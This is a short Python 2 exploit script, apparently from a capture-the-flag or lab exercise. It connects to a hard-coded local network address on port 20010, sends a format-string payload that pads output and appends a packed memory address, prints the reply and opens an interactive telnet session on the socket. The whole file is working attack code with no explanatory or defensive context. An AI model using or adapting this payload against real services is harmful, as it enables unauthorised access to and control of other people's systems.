import socket
import struct
import time 
import telnetlib 

PORT = 20010
HOST = "192.168.1.74"

def init_connection():
    print (" [ + ] Connecting to %s:%s" % (HOST, PORT))
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

def send_payload():
    payload = "%1024x\xc8\x10\xa1\xde"
    s.send(payload)

def recv_response():
    print s.recv(2048)

def interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

init_connection()
send_payload()
recv_response()
interact()
